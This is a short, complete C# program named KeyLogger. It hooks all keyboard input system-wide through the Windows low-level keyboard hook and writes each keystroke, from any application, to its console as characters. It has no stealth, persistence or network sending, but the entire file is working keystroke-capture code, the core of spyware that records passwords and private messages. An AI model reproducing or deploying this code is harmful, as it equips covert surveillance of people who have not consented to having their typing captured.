using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger
{
    internal class Program
    {
        private static IntPtr _hook;

        private static void Main(string[] args)
        {
            _hook = SetHook(LowLevelKeyboardProcCallback);

            Console.WriteLine("Logging keys...");
            Application.Run();

            UnhookWindowsHookEx(_hook);
        }

        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985%28v=vs.85%29.aspx
        private static IntPtr LowLevelKeyboardProcCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < HcAction || wParam != (IntPtr) WmKeydown)
                return CallNextHookEx(_hook, nCode, wParam, lParam);

            var virtualKeyCode = Marshal.ReadInt32(lParam);
            var key = (Keys) virtualKeyCode;
            
            // Output one timestamped character per line
            // Console.WriteLine("{0:G}: {1}", DateTime.Now, key);

            // Output key as is
            // Console.Write(key);

            // Output actual chars instead of keys
            var code = MapVirtualKey((uint) key, VirtualKeyToUnshiftedChar);
            Console.Write(Convert.ToChar(code));

            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc lowLevelKeyboardProc)
        {
            using (var currentProcess = Process.GetCurrentProcess())
            {
                using (var mainModule = currentProcess.MainModule)
                {
                    return SetWindowsHookEx(WhKeyboardLl, lowLevelKeyboardProc, GetModuleHandle(mainModule.ModuleName), 0);
                }
            }
        }

        #region DLL Imports

        private const int WhKeyboardLl = 13;
        private const int WmKeydown = 0x0100;
        private const int VirtualKeyToUnshiftedChar = 0x02;
        private const int HcAction = 0;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion
    }
}